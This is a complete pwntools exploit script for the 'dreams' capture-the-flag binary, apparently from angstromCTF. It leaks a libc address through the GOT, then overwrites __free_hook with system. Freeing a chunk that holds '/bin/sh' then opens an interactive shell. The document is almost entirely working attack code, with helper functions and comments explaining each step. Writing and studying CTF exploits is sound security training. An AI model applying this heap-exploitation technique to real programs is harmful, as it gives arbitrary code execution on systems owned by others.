from pwn import *;
from time import sleep;

if args.EXPLOIT:
    io = remote("challs.actf.co", 31227);
else:
    io = process("./dreams");

#helper function to allocate data
def alloc(index, date, data):
    io.sendline(b'1');
    r = io.recvuntil(b'? ');
    io.sendline(bytes(str(index), "ascii"));
    r = io.recvuntil(b'? ');
    io.sendline(date);
    r = io.recvuntil(b'? ');
    #sleep is needed otherwise program sometimes
    #randomly hangs
    sleep(1);
    io.sendline(data);

#helper function to free data
def free(index):
    io.sendline(b'2');
    r = io.recvuntil(b'? '); print(r);
    io.sendline(bytes(str(index), "ascii"));

exe = ELF("./dreams");
libc = ELF("./libc.so.6");

lib_sym = libc.symbols['puts'];
got_sym = exe.got['puts'];

print("GOT_SYM equ " + hex(got_sym));

dreams   = 0x404028;

#read the dynamic address of puts
io.recv();
alloc(0, b'0', p64(got_sym - 8));   # can use got to determine libc base
io.recv();
io.send(b'3\n');
io.recv();
io.send(b'521\n');
io.recvuntil(b'that ');

print("LIB SYM: " + hex(lib_sym));

leak = io.recv(6) + b'\x00\x00';
print(leak);
dyn_sym = u64(leak);
print("LEAKED SYM: " + hex(dyn_sym));

#calculate libc base address
libc.address = dyn_sym - lib_sym;
print("LIBC ADDRESS: " + hex(libc.address));

io.send(b'\n');

#get __free_hook address
hook = libc.symbols['__free_hook'];
print("FREE HOOK: " + hex(hook));

#free old zero chunk
free(0);
print(io.recv());

#allocate new chunk guaranteed to be in the same
#place as old chunk
alloc(1, b'0', p64(hook));
print(io.recv());
io.send(b'3\n');
print(io.recv());
#521 offset still works
io.send(b'521\n');
print(io.recv());
#write the address of system function in __free_hook
io.sendline(p64(libc.symbols['system']));

#write `/bin/sh` into data
print(io.recv());
io.send(b'1\n');
print(io.recv());
io.send(b'2\n');
print(io.recv());
io.send(b'/bin/sh\x00');
print(io.recv());
io.send(b'000');
print(io.recv());
#call free except free is now system
#calls system("/bin/sh")
free(2);
#shell!
io.interactive();